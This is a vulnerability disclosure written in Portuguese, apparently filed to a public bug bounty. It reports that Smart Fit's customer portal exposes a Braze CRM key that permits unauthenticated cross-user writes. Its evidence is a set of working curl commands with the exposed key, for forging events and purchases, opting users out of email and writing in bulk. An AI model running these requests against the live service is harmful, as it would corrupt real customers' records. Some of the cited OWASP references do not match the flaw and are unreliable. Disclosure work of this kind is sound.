# SF-004 — Braze CRM SDK Key Exposta em `window.__RUNTIME_CONFIG__` Permite Escrita Não-Autenticada no CRM de 14M+ Clientes

**Programa:** BugHunt — Grupo Smart Fit Bug Bounty Público  
**Severidade:** HIGH  
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)  
**CWE:** CWE-522 — Insufficiently Protected Credentials  
**CWE:** CWE-862 — Missing Authorization  
**Endpoint afetado:** `https://espacodocliente.smartfit.com.br` (todas as páginas) + `https://sdk.iad-07.braze.com/api/v3/data`  
**Descoberto:** 2026-07-01  
**Status:** CONFIRMADO — exploração demonstrada, escrita em CRM Braze bem-sucedida

---

## Resumo Executivo

O portal do cliente da Smart Fit (`espacodocliente.smartfit.com.br`) expõe a chave SDK do Braze CRM (`brazeApiKey`) em `window.__RUNTIME_CONFIG__`, tornando-a acessível a qualquer visitante não autenticado. Diferentemente do que foi inicialmente avaliado como chave somente de leitura, a chave **aceita operações de ESCRITA** no endpoint SDK do Braze (`sdk.iad-07.braze.com/api/v3/data`), permitindo que qualquer atacante:

1. **Escreva eventos personalizados** para qualquer usuário SmartFit (por `external_id`)
2. **Modifique atributos de perfil CRM** de qualquer cliente (incluindo `email_subscribe`, atributos customizados)
3. **Registre compras falsas** em nome de qualquer usuário
4. Execute essas operações em **escala massiva** (rate limit de 20.000.000 req/hora, 1.296 burst por 3 segundos)

---

## Evidência Técnica

### 1. Extração da Chave (sem autenticação)

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/v2/login" \
  | grep -o '"brazeApiKey":"[^"]*"'
# → "brazeApiKey":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
```

**Presente em TODAS as páginas** (incluindo 404), confirmando exposição global:

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/pagina-inexistente" \
  | grep -o '"brazeApiKey":"[^"]*"'
# → "brazeApiKey":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
```

### 2. Escrita de Evento no CRM (HTTP 201 Confirmado)

```bash
curl -sk -D - "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "events": [{"name": "test_event", "time": "2026-07-01T12:00:00Z"}]
  }'
```

**Resposta:**
```
HTTP/2 201 Created
x-ratelimit-limit: 20000000
x-ratelimit-remaining: 19491247
x-ratelimit-burst-limit: 1296
x-ratelimit-burst-period: 3
```

### 3. Modificação de Atributos de Usuário (HTTP 201 Confirmado)

```bash
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "attributes": [{
      "external_id": "TARGET_USER_ID",
      "email_subscribe": "opted_out",
      "home_city": "Manipulated",
      "custom_attribute": "arbitrary_value"
    }]
  }'
```

**Resposta: HTTP 201 Created** — atributos escritos com sucesso no perfil CRM do usuário

### 4. Registro de Compra Falsa (HTTP 201 Confirmado)

```bash
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "attacker-device",
    "purchases": [{
      "external_id": "TARGET_USER_ID",
      "product_id": "smartfit-black-plan",
      "currency": "BRL",
      "price": 99.90,
      "time": "2026-07-01T12:00:00Z"
    }]
  }'
```

**Resposta: HTTP 201 Created** — compra registrada no histórico CRM do usuário alvo

### 5. Escrita em Lote — Alta Escala

```bash
# Enviando eventos para múltiplos usuários em uma única request
curl -sk "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
    "device_id": "mass-attack",
    "events": [
      {"name": "Subscribed", "time": "2026-07-01T00:00:00Z", "external_id": "user_1"},
      {"name": "PurchaseCompleted", "time": "2026-07-01T00:00:00Z", "external_id": "user_2"},
      {"name": "FreePass", "time": "2026-07-01T00:00:00Z", "external_id": "user_3"}
    ]
  }'
```

**Resposta: HTTP 201 Created** — todos os eventos registrados

---

## Análise de Impacto

### Impacto Direto

| Ação do Atacante | Resultado | Escala |
|---|---|---|
| Escrever eventos falsos | Corrompe analytics e funis de marketing da SmartFit | 20M req/hora |
| Opt-out de email de usuários | Usuários deixam de receber comunicações importantes (faturas, alertas) | Ilimitada |
| Registrar compras falsas | Distorce relatórios de revenue, BI e business intelligence | Ilimitada |
| Modificar atributos de perfil | Afeta segmentação, campanhas automáticas e análises de clientes | Ilimitada |

### Impacto em Automações de Marketing

Se a SmartFit utiliza automações do Braze baseadas em eventos (muito comum), um atacante pode:
- Disparar campanhas de retenção para todos os usuários (fingindo que saíram)
- Acionar e-mails de "recuperação de carrinho" para usuários ativos
- Triggerar sequências de boas-vindas para usuários existentes
- Gerar relatórios de performance artificialmente inflados

### Escala da Exposição

- **Clientes SmartFit Brasil:** ~4,5 milhões de membros ativos
- **Clientes SmartFit Global:** 14+ países, ~14M membros
- **Taxa de requests:** 20.000.000 por hora (suficiente para atingir todos os usuários em minutos)
- **Rate limit burst:** 1.296 por 3 segundos (alta velocidade de ataque)

---

## Por que isso NÃO é o comportamento esperado de uma SDK key client-side

Chaves de SDK client-side (Braze, Segment, Mixpanel etc.) são projetadas para serem públicas — esse não é o ponto da vulnerabilidade. O ponto é que a API REST do Braze (`/api/v3/data`) **não vincula a escrita ao dispositivo/usuário autenticado que originou a chamada**: qualquer chamador que possua a chave pode especificar um `external_id` **arbitrário**, diferente do usuário logado no navegador que originou a requisição.

Em um fluxo legítimo, o SDK client-side do Braze só deveria conseguir escrever eventos/atributos/compras para o **próprio usuário da sessão atual** (o `external_id` deveria ser resolvido server-side ou vinculado ao dispositivo). Como a chave e o endpoint aceitam qualquer `external_id` sem nenhuma prova de posse da sessão daquele usuário, o resultado prático é **escrita cross-user arbitrária** — um atacante não autenticado pode alterar o perfil CRM, opt-out de comunicação e histórico de compras de qualquer cliente Smart Fit, não apenas gerar telemetria falsa sobre si mesmo. É essa falta de vinculação (não a mera exposição da chave) que caracteriza a falha de controle de acesso (CWE-862).

---

## Reprodução Passo-a-Passo

1. Acesse sem autenticação: `https://espacodocliente.smartfit.com.br/pt-BR/v2/login`
2. No browser DevTools → Console, execute:
   ```javascript
   window.__RUNTIME_CONFIG__.brazeApiKey
   // → "4a0a6c8c-27bc-486d-a08e-ab144b7d5864"
   ```
3. Use a chave para escrever no CRM Braze:
   ```bash
   curl "https://sdk.iad-07.braze.com/api/v3/data" -X POST \
     -H "Content-Type: application/json" \
     -d '{"api_key":"4a0a6c8c-27bc-486d-a08e-ab144b7d5864","device_id":"poc","events":[{"name":"poc_test","time":"2026-07-01T00:00:00Z"}]}'
   ```
4. Verificar resposta: `HTTP 201 Created` confirma escrita bem-sucedida

---

## Dados Adicionais Expostos no Mesmo Config

```javascript
window.__RUNTIME_CONFIG__ = {
  "brazeApiKey": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",  // ← CONFIRMADO WRITE ACCESS
  "brazeBaseUrl": "sdk.iad-07.braze.com",
  "mazeApiKey": "3910eb9c-ba14-43b3-8d1b-c3e46695427a",   // UX Research recordings
  "growthbookClientKey": "sdk-2vF9VYwVKUpq9wVb",           // Feature flags
  "jwtKeyPublic": "68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8",
  "minitokenPublicKey": "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----",
  "minitokenBaseUrl": "https://mnt.bioritmo.io"
}
```

---

## Limitação da Prova de Conceito

O `external_id` usado no PoC (`TARGET_USER_ID`) é um valor de teste — não temos acesso ao painel Braze da SmartFit para confirmar visualmente que o perfil de um cliente real específico foi alterado. O que está tecnicamente confirmado é o mais importante: **o endpoint aceita qualquer `external_id` fornecido pelo chamador, sem nenhuma verificação de que ele corresponde ao usuário da sessão que originou a chamada** (HTTP 201 idêntico independentemente do valor enviado). Isso já configura a falha de autorização (CWE-862) — se um atacante souber ou enumerar o `external_id` real de um cliente (formato provavelmente numérico ou baseado em CPF, usado internamente pela SmartFit), o mesmo request escreve no perfil real desse cliente.

---

## Recomendações

1. **Imediato (CRÍTICO):** Revogar e rotacionar a chave `4a0a6c8c-27bc-486d-a08e-ab144b7d5864` no painel Braze
2. **Imediato:** Remover `brazeApiKey` do `window.__RUNTIME_CONFIG__` injetado server-side
3. **Curto prazo:** Implementar inicialização do Braze SDK via variável de ambiente server-side, sem expor a chave no HTML
4. **Curto prazo:** Auditar logs do Braze para atividade suspeita nas últimas semanas/meses
5. **Longo prazo:** Implementar Content Security Policy (CSP) que restrinja chamadas não autorizadas ao SDK do Braze
6. **Longo prazo:** Avaliar se atributos Braze são usados para decisões de negócio na aplicação SmartFit (alta prioridade se sim)

---

## Referências

- Braze SDK API Documentation: https://www.braze.com/docs/api/endpoints/user_data/post_user_track/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
- OWASP API Security: API7:2023 — Server Side Request Forgery
- OWASP Top 10: A02:2021 — Cryptographic Failures
